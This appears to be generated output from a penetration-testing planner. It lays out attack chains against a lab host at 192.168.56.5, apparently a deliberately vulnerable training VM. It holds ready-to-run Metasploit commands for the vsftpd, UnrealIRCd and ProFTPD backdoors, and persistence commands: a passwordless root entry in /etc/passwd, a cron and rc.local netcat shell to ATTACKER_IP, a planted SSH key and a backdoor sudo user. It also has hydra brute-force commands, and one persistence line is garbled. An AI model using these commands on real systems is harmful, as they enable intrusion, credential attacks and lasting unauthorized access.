summary: Samba usermap_script vulnerability (ports 139/445, high risk, CVE-2007-2447)
Apache Tomcat manager upload (port 8180, high risk, CVE-2009-0580)
Apache mod_cgi Shellshock (port 80, high risk, CVE-2014-6271)
Java RMI server exploit (port 1099, high risk)

attack_chains.description: Exploit vsftpd backdoor for initial shell access, leverage shell for priv esc via kernel vuln, persist with cron job.

stages.method: Use vsftpd 2.3.4 backdoor to gain root shell
stages.verification_steps: Check if shell is obtained and user is root via whoami/id commands in the shell.
commands: msfconsole -q -x 'use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 192.168.56.5; set RPORT 21; run'

stages.method: From shell, exploit local kernel vulnerability if needed (though vsftpd often gives root)
stages.verification_steps: Run id command to confirm root privileges.

stages.method: Add backdoor user or cron job for reverse shell
stages.verification_steps: Verify cron job with crontab -l or check /etc/passwd for new user.
commands: In shell: echo 'root:*:0:0:root:/root:/bin/bash' >> /etc/passwd; echo 'root:!:12345:7:::0:Running cron job: * * * * * /bin/nc -e /bin/sh ATTACKER_IP 4444' | crontab -

attack_chains.description: Exploit Samba usermap for command execution, escalate via distcc if needed, persist with SSH key.

stages.method: Exploit Samba usermap_script to execute commands as root
stages.verification_steps: Confirm command execution by pinging back or reading /etc/passwd.

stages.method: Use distcc_exec on port 1524 for root shell if initial access is low priv
stages.verification_steps: Check privileges with id in the new shell.

stages.method: Install SSH authorized key for persistent access
stages.verification_steps: Test SSH login with the new key from Kali.
commands: In shell: mkdir -p /root/.ssh; echo 'ssh-rsa PUBLIC_KEY_HERE' >> /root/.ssh/authorized_keys; chmod 600 /root/.ssh/authorized_keys

attack_chains.description: Exploit UnrealIRCd backdoor for shell, escalate via ProFTPD if chained, persist with service modification.

stages.method: Use UnrealIRCd backdoor to spawn root shell
stages.verification_steps: Interact with shell and run whoami to confirm root.
commands: msfconsole -q -x 'use exploit/unix/irc/unreal_ircd_3281_backdoor; set RHOSTS 192.168.56.5; set RPORT 6667; run'

stages.method: If needed, chain to ProFTPD backdoor for another root vector
stages.verification_steps: Confirm escalated shell with ps aux or id.
commands: msfconsole -q -x 'use exploit/unix/ftp/proftpd_133c_backdoor; set RHOSTS 192.168.56.5; set RPORT 2121; run'

stages.method: Modify init script or add user for boot persistence
stages.verification_steps: Reboot VM and check if backdoor listens (netstat).
commands: In shell: useradd -m backdoor -G sudo; echo 'backdoor:password' | chpasswd; echo '@reboot /bin/nc -lvp 9999 -e /bin/sh' >> /etc/rc.local

followup_requests: Run full directory brute-force on web ports 80 and 8180: gobuster dir -u http://192.168.56.5 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -s 200,204,301,302 -x php,html,txt
Brute-force credentials on SSH port 22: hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.5
Enumerate MySQL users and databases: nmap --script mysql-enum -p 3306 192.168.56.5
Scan for additional RPC services: rpcinfo -p 192.168.56.5
